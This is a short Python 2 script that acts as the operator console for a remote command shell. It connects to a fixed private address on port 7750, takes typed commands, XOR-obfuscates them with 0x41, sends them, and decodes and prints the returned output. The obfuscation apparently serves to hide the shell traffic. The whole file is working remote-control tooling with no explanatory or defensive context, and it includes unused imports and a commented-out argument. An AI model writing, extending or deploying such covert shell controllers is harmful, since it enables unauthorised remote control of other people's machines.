import socket, subprocess, sys
#RHOST = sys.argv[0]
RPORT = 7750
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.101', RPORT))

while True:
    command = raw_input('~$ ')
    encode = bytearray(command)
    for i in range(len(encode)):
        encode[i] ^= 0x41    
    s.send(encode)
    en_data = s.recv(2048) 
    decode = bytearray(en_data)
    for i in range(len(decode)):
        decode[i] ^= 0x41
    print decode
s.close()